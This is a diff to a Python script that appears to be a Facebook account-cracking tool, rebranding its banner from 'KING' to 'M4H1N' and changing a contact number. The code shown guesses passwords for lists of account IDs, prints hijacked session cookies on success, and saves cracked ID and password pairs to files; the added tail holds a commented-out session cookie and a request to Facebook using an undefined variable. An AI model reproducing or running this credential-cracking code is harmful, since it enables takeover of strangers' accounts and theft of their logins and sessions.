@@ -90,20 +90,20 @@ ha = current.day
 today = date.today()
 logo ="""
 \t╔══════════════════════════════════╗
-\t║\033[32;1mKG    KG \033[33;1mKING \033[37;1mKG    KG  \033[34;1mKINGKG    ║\033[33;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKG   KG   \033[33;1mKG  \033[37;1mKG#   KG \033[34;1mKG    KG   ║\033[32;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKG  KG    \033[33;1mKG  \033[37;1mKING  KG \033[34;1mKG         ║\033[33;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKING#     \033[33;1mKG  \033[37;1mKG KG KG \033[34;1mKG   KING  ║\033[34;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKG  KG    \033[33;1mKG  \033[37;1mKG  KING \033[34;1mKG    KG   ║\033[35;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKG   KG   \033[33;1mKG  \033[37;1mKG   KG# \033[34;1mKG    KG   ║\033[36;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t║\033[32;1mKG    KG \033[33;1mKING \033[37;1mKG    KG  \033[34;1mKINGKG    ║\033[37;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
+\t║\033[32;1mKING    KING \033[33;1mM4H1N \033[37;1mKING    KING  \033[34;1mM4H1NKING    ║\033[33;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
+\t║\033[32;1mKING   KING   \033[33;1mKING  \033[37;1mKING#   KING \033[34;1mKING    KING   ║\033[32;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
+\t║\033[32;1mKING  KING    \033[33;1mKING  \033[37;1mM4H1N  KING \033[34;1mKING         ║\033[33;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
+\t║\033[32;1mM4H1N#     \033[33;1mKING  \033[37;1mKING KING KING \033[34;1mKING   M4H1N  ║\033[34;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
+\t║\033[32;1mKING  KING    \033[33;1mKING  \033[37;1mKING  M4H1N \033[34;1mKING    KING   ║\033[35;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
+\t║\033[32;1mKING   KING   \033[33;1mKING  \033[37;1mKING   KING# \033[34;1mKING    KING   ║\033[36;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
+\t║\033[32;1mKING    KING \033[33;1mM4H1N \033[37;1mKING    KING  \033[34;1mM4H1NKING    ║\033[37;1m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
 \t╚══════════════════════════════════╝
-\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46m𝗞𝗜𝗡𝗚\033[1;39m━━━━━━━━━━━━━━━━━━━━┓
+\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mM4H1N\033[1;39m━━━━━━━━━━━━━━━━━━━━┓
 \033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★]𝔻4𝔻𝕐-𝕄4ℍ1ℕ\033[1;39m         ┃
 \033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★]𝕄𝔸ℍ𝕀ℕ 𝔸ℍ𝕄𝔼𝔻\033[1;39m         ┃
 \033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★]𝔻4𝔻𝕐-𝕄4ℍ1ℕ\033[1;39m       ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★]𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        ┃
-\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m    : [★]+𝟴𝟴𝟬𝟭𝟵𝟯𝟵𝟲𝟳𝟯𝟰𝟳𝟳\033[1;39m     ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★] BD X IND\033[1;39m        ┃
+\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m    : [★]+8801929974678\033[1;39m     ┃
 \033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[1;34m  : [★]ℝ𝔸ℕ𝔻𝕆𝕄-ℂ𝕃𝕆ℕ𝕀ℕℍ\033[1;39m     ┃
 \033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★]𝔽ℝ𝔼𝔼 𝕋𝕆𝕆𝕃\033[1;39m            ┃
  \033[1;39m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31m𝙁𝙄𝙍𝙀\033[1;39m━━━━━━━━━━━━━━━━━━━━┛"""
@@ -202,7 +202,7 @@ def xr():
             manshera.submit(rcrack,uid,pwx,tl)
     print('\n\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
     print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Crack process has been completed')
-    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in KING/ok.txt,KING/cp.txt')
+    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in M4H1N/ok.txt,M4H1N/cp.txt')
     print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
 
 def rcrack(uid,pwx,tl):
@@ -246,23 +246,46 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(' \n\033[1;97m[\033[1;92mKING-OK\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m COOKIES \033[1;91m=\033[1;96m '+coki+'')                
+                print(' \n\033[1;97m[\033[1;92mM4H1N-OK\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m COOKIES \033[1;91m=\033[1;96m '+coki+'')                
                 open('/sdcard/paid-ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                #print('[KING-CP] ' +uid+ '|' +ps+ '')
+                #print('[M4H1N-CP] ' +uid+ '|' +ps+ '')
                 open('/sdcard/paid-cp.txt', 'a').write( uid+' | '+ps+'')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r \033[1;91m[\033[1;97mKING\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
+        sys.stdout.write('\r \033[1;91m[\033[1;97mM4H1N\033[1;91m][\033[1;97m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
         sys.stdout.flush()
     except:
         pass
+import requests
 
+headers = {
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-MM,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=3badZAQy2v0EZkpcNb3XGQ0Z; sb=3badZIXid-CYPwCBnEvuiWfB; dnonce=AWlmh1dVNUNL6LAwFlvvOEPOhlr85qYfuffF_YfHncKjmrUW-wdAnr7GH9GMxnQS1wD2NlXpB4g51Pik89ecdfSB; m_pixel_ratio=2; wd=980x1911; fr=03nvLlshlaCMxfR2g..Bknbbd.AG.AAA.0.0.Bknbbo.AWUcKKjkbog',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+    'viewport-width': '980',
+}
+
+response = requests.get('https://m.facebook.com/', cookies=cookies, headers=headers)
 xr()
